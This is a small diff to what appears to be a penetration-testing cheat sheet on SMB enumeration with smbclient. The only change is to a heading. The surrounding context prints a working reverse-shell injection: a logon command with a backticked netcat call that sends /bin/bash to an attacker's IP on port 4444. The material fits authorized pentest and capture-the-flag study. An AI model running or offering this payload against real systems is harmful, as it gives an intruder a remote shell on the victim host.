@@ -12,7 +12,7 @@ smbclient -L $IP -U "WorkgroupMasterName"
 ```
 smbclient //$IP/share
 ```
-### reverse shell with smb if 'logon' command exists
+### reverse shell with smb on linux if 'logon' command exists
 ```
 smb: \> logon “/=`nc 'myIP' 4444 -e /bin/bash`"
 ```
